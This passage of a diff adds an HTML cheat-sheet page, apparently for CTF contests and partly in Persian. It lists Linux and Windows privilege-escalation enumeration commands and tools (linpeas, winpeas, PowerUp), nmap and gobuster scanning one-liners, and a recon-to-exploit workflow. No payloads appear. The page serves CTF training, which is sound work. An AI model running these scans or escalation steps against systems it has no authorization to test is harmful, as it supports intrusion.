+# ========== CRON ==========
+cat /etc/crontab
+ls -la /etc/cron*
+
+# ========== CAPABILITIES ==========
+getcap -r / 2>/dev/null
+
+# ========== WRITABLE FILES ==========
+find / -writable -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+
+# ========== KERNEL EXPLOITS ==========
+linux-exploit-suggester
+searchsploit linux kernel
+
+# ========== TOOLS ==========
+linpeas -a
+pspy -a</code></pre>
+            </div>
+
+            <h3 class="sub-title">Windows PE</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">:: ========== USER PRIVILEGES ==========
+whoami /priv
+whoami /groups
+
+:: ========== SERVICE PERMISSIONS ==========
+sc qc service_name
+accesschk.exe -ucqv service_name
+
+:: ========== SCHEDULED TASKS ==========
+schtasks /query /fo LIST /v
+
+:: ========== REGISTRY ==========
+reg query HKLM\SOFTWARE
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+:: ========== TOOLS ==========
+winpeas.exe
+PowerUp.ps1
+Seatbelt.exe</code></pre>
+            </div>
+        </section>
+
+        <!-- 6. REPORTING -->
+        <section id="reporting" class="tool-section">
+            <h2 class="tool-title">6️⃣ REPORTING CHEAT SHEET</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== RUN CTF REPORTER ==========
+python3 ctf_reporter.py -t TARGET
+
+# ========== PARSE ONLY ==========
+python3 ctf_reporter.py -t TARGET --parse
+
+# ========== FROM DIRECTORY ==========
+python3 ctf_reporter.py -i ./results/
+
+# ========== OUTPUT FILES ==========
+# report.html  - HTML Report
+# report.md    - Markdown Report
+# report.txt   - Plain Text Report
+# full_data.json - All Data</code></pre>
+            </div>
+        </section>
+
+        <!-- MASTER REFERENCE -->
+        <section id="master_ref" class="tool-section">
+            <h2 class="tool-title">🔥 MASTER COMMAND REFERENCE</h2>
+            <div class="goal-box"><strong>📌 هدف:</strong> دستورات یک‌خطی (One-Liners) برای انجام سریع مراحل در مسابقات CTF</div>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== ONE-LINER NMAP ==========
+nmap -sC -sV -O -p- -T4 TARGET -oA full_scan
+
+# ========== ONE-LINER RECON ==========
+nmap -sV -p21,22,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 TARGET
+
+# ========== ONE-LINER WEB ==========
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
+
+# ========== ONE-LINER POST ==========
+find / -name "flag*" -type f 2>/dev/null && find / -perm -4000 -type f 2>/dev/null && sudo -l && cat /etc/crontab
+
+# ========== ONE-LINER REPORT ==========
+python3 ctf_reporter.py -t TARGET</code></pre>
+            </div>
+        </section>
+
+        <!-- SUCCESS FORMULA -->
+        <section id="formula" class="tool-section">
+            <h2 class="tool-title">🏆 CTF SUCCESS FORMULA</h2>
+            <div class="goal-box"><strong>📌 هدف:</strong> فرمول طلایی موفقیت در مسابقات CTF</div>
+            
+            <div class="success-box">
+                <p>1. Recon → Information Gathering (جمع‌آوری اطلاعات)</p>
+                <p>2. Scan → Find Vulnerabilities (کشف آسیب‌پذیری‌ها)</p>
+                <p>3. Exploit → Get Access (کسب دسترسی)</p>
+                <p>4. Post-Exploit → Enumerate & Escalate (شمارش و ارتقا دسترسی)</p>
+                <p>5. Report → Document Everything (مستندسازی همه‌چیز)</p>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Initialize Highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        // Copy to Clipboard Function
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-container').querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.innerText;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.innerText = '✓ کپی شد';
+            btn.style.background = '#e3b341';
+            btn.style.color = '#000';
+            btn.style.borderColor = '#e3b341';
+            
+            setTimeout(() => {
+                btn.innerText = 'کپی';
+                btn.style.background = '';
+                btn.style.color = '';
+                btn.style.borderColor = '';
+            }, 2000);
+        }
+
+        // Live Search Filter
+        function filterTools() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const listItems = document.querySelectorAll('.nav-list li');
+            
+            listItems.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if (text.includes(input)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ScrollSpy Implementation
+        const sections = document.querySelectorAll('.tool-section');
+        const navLinks = document.querySelectorAll('.nav-list a');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 50) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if (a.getAttribute('href') === '#' + current) {
+                    a.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
